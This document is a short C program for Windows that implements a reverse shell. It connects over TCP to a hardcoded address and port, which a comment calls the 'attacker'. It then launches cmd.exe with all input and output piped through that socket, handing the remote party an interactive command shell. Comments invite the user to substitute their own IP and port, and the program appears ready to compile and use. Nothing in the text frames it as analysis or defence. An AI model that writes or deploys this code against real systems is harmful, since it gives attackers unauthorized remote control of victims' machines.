#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

int main() {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
        return 1;
    }

    // Create socket
    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }

    // Setup server address
    server.sin_family = AF_INET;
    server.sin_port = htons(4343); // Replace with your port
    server.sin_addr.s_addr = inet_addr("192.168.45.243"); // Replace with your IP

    // Connect to attacker
    if (WSAConnect(sock, (SOCKADDR*)&server, sizeof(server), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // Setup STARTUPINFO structure
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;

    // Create cmd.exe process with redirected IO
    if (!CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // Wait for the shell to exit
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Cleanup
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(sock);
    WSACleanup();

    return 0;
}
